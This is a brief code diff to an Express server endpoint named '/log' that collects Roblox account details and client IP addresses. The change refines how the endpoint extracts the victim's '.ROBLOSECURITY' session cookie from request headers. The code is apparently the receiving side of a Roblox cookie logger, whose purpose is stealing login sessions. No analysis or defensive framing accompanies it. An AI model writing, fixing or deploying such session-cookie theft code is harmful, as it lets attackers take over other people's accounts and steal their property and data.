@@ -41,7 +41,11 @@ app.post('/log', async (req, res) => {
     try {
         const { username, displayName, userId, gameId, accountAge, region } = req.body;
 
-        const robloxCookie = req.headers['cookie']?.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || 'N/A';
+const robloxCookie = req.headers['cookie']
+    ?.split(';')
+    .find(c => c.includes('.ROBLOSECURITY='))
+    ?.split('=')[1] || 'N/A';
+
 
         const clientIP = req.ip || req.connection.remoteAddress || 'N/A';
 
